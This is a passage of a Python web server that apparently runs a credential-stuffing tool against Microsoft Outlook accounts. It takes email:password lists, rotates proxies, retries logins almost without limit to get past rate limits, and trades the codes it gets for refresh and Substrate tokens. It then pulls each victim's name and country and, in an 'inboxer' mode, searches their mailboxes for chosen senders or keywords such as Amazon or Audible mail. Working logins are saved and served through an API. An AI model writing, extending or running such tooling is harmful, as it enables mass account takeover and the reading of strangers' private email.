        data={"client_info": "1", "client_id": _MSFT_CLIENT_ID,
              "redirect_uri": _MSFT_REDIRECT_URI, "grant_type": "authorization_code",
              "code": code, "scope": _MSFT_SCOPE_LOGIN},
        headers=_MSFT_MSAL_HDR, timeout=_MSFT_TIMEOUT,
    )
    if r.status_code != 200:
        return None
    rt = r.json().get("refresh_token", "")
    if not rt:
        return None
    try:
        session.get(
            f"https://odc.officeapps.live.com/odc/v2.1/federationprovider?domain={_MSFT_TENANT_ID}",
            headers={"Host": "odc.officeapps.live.com", "User-Agent": _MSFT_UA_DALVIK},
            timeout=15,
        )
    except Exception:
        pass
    r2 = session.post(
        f"https://login.microsoftonline.com/{_MSFT_TENANT_ID}/oauth2/v2.0/token",
        data={"client_info": "1", "client_id": _MSFT_CLIENT_ID, "refresh_token": rt,
              "scope": f"profile openid offline_access https://substrate.office.com/.default",
              "grant_type": "refresh_token"},
        headers=_MSFT_MSAL_HDR, timeout=_MSFT_TIMEOUT,
    )
    st = r2.json().get("access_token", "") if r2.status_code == 200 else ""
    return {"refresh_token": rt, "substrate_token": st}


def _msft_get_profile(session, substrate_token: str, email: str,
                       mspcid: str) -> Tuple[str, str]:
    """Fetch display name + country via substrate. Returns ('', '') on failure."""
    try:
        anchor = f"CID:{mspcid}" if mspcid else f"UPN:{email}"
        r = session.get(
            "https://substrate.office.com/profileb2/v2.0/me/V1Profile",
            headers={"Accept": "application/json",
                     "Authorization": f"Bearer {substrate_token}",
                     "Host": "substrate.office.com",
                     "User-Agent": _MSFT_UA_DALVIK,
                     "X-AnchorMailbox": anchor,
                     "X-ClientRequestId": "3d0f0eea-617a-4b9c-a747-100934dca583"},
            timeout=_MSFT_TIMEOUT,
        )
        d = r.json() if r.status_code == 200 else {}
        name = ""
        if d.get("names"):
            name = (d["names"][0].get("displayNameDefault") or
                    d["names"][0].get("displayName") or "")
        name = name or d.get("displayName", "")
        country = ""
        if d.get("accounts"):
            country = d["accounts"][0].get("location", "")
        country = country or d.get("country", "")
        return name, country
    except Exception:
        return "", ""


def _msft_search_inbox(session, refresh_token: str, email: str,
                        keyword: str, timeout: int = 30,
                        sender: str = "",
                        date_from: str = "",
                        date_to: str = "") -> int:
    """Search inbox for keyword (+ optional from:/date filters), return match count."""
    # Build query string: combine sender filter + date range + keyword (KQL)
    parts = []
    if sender:
        # Support multiple senders comma-separated: "amazon.de,audible.de"
        senders = [s.strip() for s in sender.split(",") if s.strip()]
        if len(senders) == 1:
            parts.append(f"from:{senders[0]}")
        elif senders:
            from_clause = " OR ".join(f"from:{s}" for s in senders)
            parts.append(f"({from_clause})")
    # KQL date range: received:start..end (Exchange accepts M/D/YYYY and ISO)
    if date_from and date_to:
        parts.append(f"received:{date_from}..{date_to}")
    elif date_from:
        parts.append(f"received:>={date_from}")
    elif date_to:
        parts.append(f"received:<={date_to}")
    if keyword:
        parts.append(keyword)
    query_string = " ".join(parts) if parts else "*"
    # 2026-09: EWS/IMAP scopes are no longer grantable for this client_id
    # (AADSTS70000). The Substrate search API accepts the substrate scope token.
    r = session.post(
        f"https://login.microsoftonline.com/{_MSFT_TENANT_ID}/oauth2/v2.0/token",
        data={"client_id": _MSFT_CLIENT_ID, "refresh_token": refresh_token,
              "scope": _MSFT_SCOPE_SUBSTRATE, "grant_type": "refresh_token"},
        headers=_MSFT_MSAL_HDR, timeout=_MSFT_TIMEOUT,
    )
    at = r.json().get("access_token", "") if r.status_code == 200 else ""
    if not at:
        return 0
    try:
        r2 = session.post(
            "https://substrate.office.com/search/api/v2/query",
            params={"n": "50", "cv": "tNZ1DVP5NhDwG%2FDUCelaIu.124"},
            json={
                "Cvid": "7ef2720e-6e59-ee2b-a217-3a4f427ab0f7",
                "Scenario": {"Name": "owa.react"},
                "TimeZone": "Europe/Berlin",
                "TextDecorations": "Off",
                "EntityRequests": [{
                    "EntityType": "Conversation",
                    "ContentSources": ["Exchange"],
                    "Filter": {"Or": [
                        {"Term": {"DistinguishedFolderName": "msgfolderroot"}},
                        {"Term": {"DistinguishedFolderName": "DeletedItems"}},
                    ]},
                    "From": 0,
                    "Query": {"QueryString": query_string},
                    "Size": 25,
                    "Sort": [{"Field": "Score", "SortDirection": "Desc", "Count": 3},
                              {"Field": "Time", "SortDirection": "Desc"}],
                    "EnableTopResults": True, "TopResultsCount": 3,
                }],
                "QueryAlterationOptions": {
                    "EnableSuggestion": True, "EnableAlteration": True,
                    "SupportedRecourseDisplayTypes": ["Suggestion", "NoResultModification",
                        "NoResultFolderRefinerModification", "NoRequeryModification", "Modification"],
                },
                "LogicalId": "446c567a-02d9-b739-b9ca-616e0d45905c",
            },
            headers={
                "Accept": "application/json",
                "Authorization": f"Bearer {at}",
                "Content-Type": "application/json",
                "User-Agent": "Outlook-Android/4.618.3",
                "X-AnchorMailbox": f"UPN:{email}",
            },
            timeout=timeout,
        )
        total = 0
        for es in (r2.json() if r2.status_code == 200 else {}).get("EntitySets", []):
            for rs in es.get("ResultSets", []):
                total = rs.get("Total", total)
        return total
    except Exception:
        return 0


def _run_outlook_account(email: str, password: str, proxy: Optional[Dict],
                          mode: str, keyword: str, sender: str = "",
                          date_from: str = "", date_to: str = "") -> None:
    """Run one account: brute + optional inbox search. Updates _OUTLOOK_STATE."""
    import requests as _rq
    session = _rq.Session()
    if proxy:
        session.proxies.update(proxy)
    session.headers["User-Agent"] = _MSFT_UA_BROWSER

    max_retries = 9_999_999
    for attempt in range(max_retries):
        if _OUTLOOK_STOP.is_set():
            with _OUTLOOK_LOCK:
                _OUTLOOK_STATE["bad"] += 1
            return

        try:
            page = _msft_login_page(session, email)
            if not page:
                with _OUTLOOK_LOCK:
                    _OUTLOOK_STATE["retries"] += 1
                time.sleep(0.5)
                continue

            code = _msft_submit_creds(session, page["url_post"], page["ppft"],
                                       page["nonce"], email, password)
            if code == "":
                # 429 / rate limited
                with _OUTLOOK_LOCK:
                    _OUTLOOK_STATE["retries"] += 1
                time.sleep(1.0)
                continue
            if not code:
                # Bad password / not found
                _outlook_add_result(email, password, "bad", "", "", 0)
                _append_log(f"[-] outlook bad: {email}")
                return

            tokens = _msft_exchange_code(session, code)
            if not tokens or not tokens.get("refresh_token"):
                _outlook_add_result(email, password, "bad", "", "", 0)
                _append_log(f"[-] outlook no token: {email}")
                return

            # Extract MSPCID from session cookies for profile anchor
            mspcid = ""
            for ck in session.cookies:
                if ck.name and "MSPCID" in ck.name.upper():
                    mspcid = (ck.value or "").upper()
                    break

            name, country = _msft_get_profile(
                session, tokens.get("substrate_token", ""), email, mspcid
            )

            found_count = 0
            if mode == "inboxer" and (keyword or sender or date_from or date_to):
                found_count = _msft_search_inbox(
                    session, tokens["refresh_token"], email, keyword,
                    sender=sender, date_from=date_from, date_to=date_to,
                )
                if found_count > 0:
                    _append_log(f"[+] outlook INBOX HIT: {email} | Found: {found_count} | q={keyword} from={sender} {date_from}..{date_to}")
                    with open(_OUTLOOK_RESULTS_FILE.parent / "outlook_inbox.txt", "a", encoding="utf-8") as fh:
                        fh.write(f"{email}:{password} | Name: {name} | Country: {country} | Found: {found_count}\n")

            _outlook_add_result(email, password, "hit", name, country, found_count)
            _append_log(f"[+] outlook hit: {email} | {name} | {country}")

            with open(_OUTLOOK_RESULTS_FILE, "a", encoding="utf-8") as fh:
                fh.write(f"{email}:{password} | Name: {name} | Country: {country}\n")
            return

        except Exception as exc:
            with _OUTLOOK_LOCK:
                _OUTLOOK_STATE["retries"] += 1
            time.sleep(0.5)
            continue

    _outlook_add_result(email, password, "bad", "", "", 0)


def _run_outlook(accounts: List[Tuple[str, str]], mode: str, keyword: str,
                  sender: str, proxy_file: Optional[str], workers: int,
                  date_from: str = "", date_to: str = "") -> None:
    """Batch runner. Runs in a background thread."""
    # Build proxy pool (round-robin)
    proxies: List[str] = []
    if proxy_file:
        is_path = len(proxy_file) < 512 and "\n" not in proxy_file
        raw = ""
        if is_path:
            try:
                p = Path(proxy_file)
                if p.is_file():
                    raw = p.read_text(encoding="utf-8", errors="replace")
            except OSError:
                raw = proxy_file
        else:
            raw = proxy_file
        for ln in raw.splitlines():
            ln = ln.strip().split()[0] if ln.strip() else ""
            if ln and not ln.startswith("#"):
                proxies.append(ln)

    _proxy_idx = [0]
    _proxy_lock = threading.Lock()

    def _parse_proxy_str(s: str) -> Optional[Dict]:
        s = s.strip()
        if not s or s.startswith("#"):
            return None
        try:
            if "://" in s:
                m = re.match(r'(https?|socks[45])://([^:@]+):([^@]+)@([^:]+):(\d+)', s)
                if m:
                    return {"http": s, "https": s}
                return {"http": s, "https": s}
            parts = s.split(":")
            if len(parts) == 4:
                return {"http": f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}",
                        "https": f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"}
            if len(parts) == 2:
                return {"http": f"http://{parts[0]}:{parts[1]}",
                        "https": f"http://{parts[0]}:{parts[1]}"}
        except Exception:
            pass
        return None

    def _get_proxy() -> Optional[Dict]:
        if not proxies:
            return None
        with _proxy_lock:
            idx = _proxy_idx[0] % len(proxies)
            _proxy_idx[0] += 1
        return _parse_proxy_str(proxies[idx])

    _append_log(f"[*] outlook: starting {len(accounts)} accounts · mode={mode} · workers={workers}")
    total = len(accounts)
    done = [0]
    lock = threading.Lock()

    def _do_one(acc: Tuple[str, str]) -> None:
        em, pw = acc
        proxy = _get_proxy()
        _run_outlook_account(em, pw, proxy, mode, keyword or "", sender or "",
                             date_from or "", date_to or "")
        with lock:
            done[0] += 1
            pct = done[0] / total * 100
            with _OUTLOOK_LOCK:
                h = _OUTLOOK_STATE["hits"]
                b = _OUTLOOK_STATE["bad"]
                f = _OUTLOOK_STATE["found"]
            _append_log(f"[{done[0]:>4}/{total}] ({pct:5.1f}%) {em} → {'HIT' if h else 'bad'}")

    try:
        with __import__("concurrent.futures", fromlist=["ThreadPoolExecutor"]).ThreadPoolExecutor(
                max_workers=workers) as pool:
            futs = {pool.submit(_do_one, acc): acc for acc in accounts}
            for fut in __import__("concurrent.futures", fromlist=["as_completed"]).as_completed(futs):
                if _OUTLOOK_STOP.is_set():
                    pool.shutdown(wait=False, cancel_futures=True)
                    break
                try:
                    fut.result()
                except Exception:
                    pass
    except Exception as exc:
        with _OUTLOOK_LOCK:
            _OUTLOOK_STATE["error"] = str(exc)
    finally:
        with _OUTLOOK_LOCK:
            _OUTLOOK_STATE["running"] = False
            _OUTLOOK_STATE["done"] = True
            _OUTLOOK_STATE["finished_at"] = time.time()
        _append_log("[*] outlook: job finished")


@app.post("/api/outlook/start")
async def api_outlook_start(
    body: OutlookBody, x_access_key: Optional[str] = Header(None)
) -> Dict[str, Any]:
    _require_auth(x_access_key)
    with _OUTLOOK_LOCK:
        if _OUTLOOK_STATE["running"]:
            raise HTTPException(status_code=409, detail="outlook job already running")
    accounts: List[Tuple[str, str]] = []
    for line in body.accounts:
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        parts = line.split(":", 1)
        if len(parts) == 2:
            accounts.append((parts[0].strip(), parts[1].strip()))
    if not accounts:
        raise HTTPException(status_code=400, detail="no valid email:password lines")
    workers = body.workers or (15 if body.mode == "inboxer" else 100)
    workers = min(max(workers, 1), 150)
    date_from = (body.date_from or "").strip()
    date_to = (body.date_to or "").strip()
    # normalize: accept both dd.mm.yyyy and yyyy-mm-dd -> Exchange M/D/YYYY KQL
    def _norm_date(v: str) -> str:
        if not v:
            return ""
        v = v.strip()
        if re.match(r"^\d{4}-\d{2}-\d{2}$", v):
            y, m, d = v.split("-")
            return f"{int(m)}/{int(d)}/{y}"
        if re.match(r"^\d{1,2}/\d{1,2}/\d{4}$", v):
            m, d, y = v.split("/")
            return f"{int(m)}/{int(d)}/{y}"
        if re.match(r"^\d{1,2}\.\d{1,2}\.\d{4}$", v):
            d, m, y = v.split(".")
            return f"{int(m)}/{int(d)}/{y}"
        return ""  # invalid -> ignored
    df, dt = _norm_date(date_from), _norm_date(date_to)
    _outlook_reset(len(accounts), body.mode, body.keyword or "", body.sender or "", df, dt)
    threading.Thread(
        target=_run_outlook,
        args=(accounts, body.mode, body.keyword or "", body.sender or "",
              body.proxy_file, workers, df, dt),
        daemon=True,
    ).start()
    return {"ok": True, "started": True, "total": len(accounts)}


@app.post("/api/outlook/stop")
async def api_outlook_stop(x_access_key: Optional[str] = Header(None)) -> Dict[str, Any]:
    _require_auth(x_access_key)
    _OUTLOOK_STOP.set()
    _append_log("[!] outlook stop requested from web")
    return {"ok": True, "stopped": True}


@app.get("/api/outlook/status")
async def api_outlook_status(x_access_key: Optional[str] = Header(None)) -> Dict[str, Any]:
    _require_auth(x_access_key)
    with _OUTLOOK_LOCK:
        return {"ok": True, **_OUTLOOK_STATE}


@app.get("/api/outlook/results")
async def api_outlook_results(
    x_access_key: Optional[str] = Header(None),
    kind: str = Query("all", pattern="^(all|hits|inbox|bad)(,(all|hits|inbox|bad))*$"),
    meta: str = Query("0", pattern="^(0|1)$"),
) -> Response:
    _require_auth(x_access_key)
    keep_detail = meta == "1"

    def creds_only(line: str) -> str:
        if keep_detail:
            return line
        return line.split(" | ")[0].strip()

    kinds = [k for k in (kind or "").split(",") if k]
    want_all = (not kinds) or ("all" in kinds)

    # Latest line per email across the persisted files (they are append-only).
    hits: dict[str, str] = {}
    inbox: dict[str, str] = {}
    bad: dict[str, str] = {}

    if _OUTLOOK_RESULTS_FILE.exists():
        for ln in _OUTLOOK_RESULTS_FILE.read_text(encoding="utf-8").splitlines():
            ln = ln.strip()
            if not ln:
                continue
            hits[ln.split(":", 1)[0]] = ln

    inbox_path = _OUTLOOK_RESULTS_FILE.parent / "outlook_inbox.txt"
    if inbox_path.exists():
        for ln in inbox_path.read_text(encoding="utf-8").splitlines():
            ln = ln.strip()
            if not ln:
                continue
            inbox[ln.split(":", 1)[0]] = ln

    bad_path = _OUTLOOK_RESULTS_FILE.parent / "outlook_bad.txt"
    if (want_all or "bad" in kinds) and bad_path.exists():
        for ln in bad_path.read_text(encoding="utf-8").splitlines():
            ln = ln.strip()
            if not ln:
                continue
            bad[ln.split(":", 1)[0]] = ln

    def want(key: str) -> bool:
        return want_all or key in kinds

    merged: dict[str, str] = {}
    if want("bad"):   merged.update(bad)
    if want("hits"):  merged.update({**hits, **inbox})
    if want("inbox"): merged.update(inbox)
    return Response(content="\n".join(creds_only(v) for v in merged.values()),
                    media_type="text/plain")


# --------------------------------------------------------------------------- #
# Auth + static frontend
# --------------------------------------------------------------------------- #
@app.get("/", include_in_schema=False)
async def root() -> Response:
    index = DIST / "index.html"
    if index.is_file():
        return FileResponse(index, headers={"Cache-Control": "no-store"})
    return Response("frontend not built: run `npm run build` in frontend/", status_code=200)


@app.get("/health")
async def health() -> Dict[str, Any]:
    return {"ok": True, "service": "audible-fp"}


@app.get("/monitor/status")
async def monitor_status(x_access_key: Optional[str] = Header(None)) -> Dict[str, Any]:
    _require_auth(x_access_key)
    with _AUDIBLE_LOCK:
        return {"ok": True, "service": "audible-fp", "running_job": bool(_AUDIBLE_STATE["running"])}


@app.post("/api/auth")
async def api_auth(body: AuthBody, request: Request) -> Dict[str, Any]:
    if not AUTH_ENABLED:
        return {"ok": True, "needs_auth": False, "token": ""}
    if not _valid_credential((body.username or "").strip(), (body.password or "").strip()):
        ip = _client_ip(request)
        wait = _auth_rate_limited(ip)
        if wait > 0:
            return JSONResponse(
                {"ok": False, "detail": f"too many attempts, retry in {int(wait)}s"},
                status_code=429,
                headers={"Retry-After": str(int(wait))},
            )
        return JSONResponse({"ok": False, "detail": "invalid username or password"}, status_code=403)
    _auth_reset(_client_ip(request))
    return {"ok": True, "needs_auth": True, "token": _issue_token()}


@app.post("/api/logout")
async def api_logout(x_access_key: Optional[str] = Header(None)) -> Dict[str, Any]:
    key = (x_access_key or "").strip()
    if AUTH_ENABLED and key:
        with _SESSION_LOCK:
            _sessions.pop(key, None)
    return {"ok": True}


# /api/config is consumed by api.js on boot to decide the login screen.
# Audible-only build has nothing to configure, so just report auth state.
@app.get("/api/config")
async def api_get_config(x_access_key: Optional[str] = Header(None)) -> Dict[str, Any]:
    return {"ok": True, "config": {}, "needs_auth": AUTH_ENABLED}


if (DIST / "assets").is_dir():
    app.mount("/assets", StaticFiles(directory=str(DIST / "assets")), name="assets")


def main() -> None:
    import uvicorn

    uvicorn.run("web.server:app", host=HOST, port=PORT, workers=1, log_level="info")


if __name__ == "__main__":
    main()
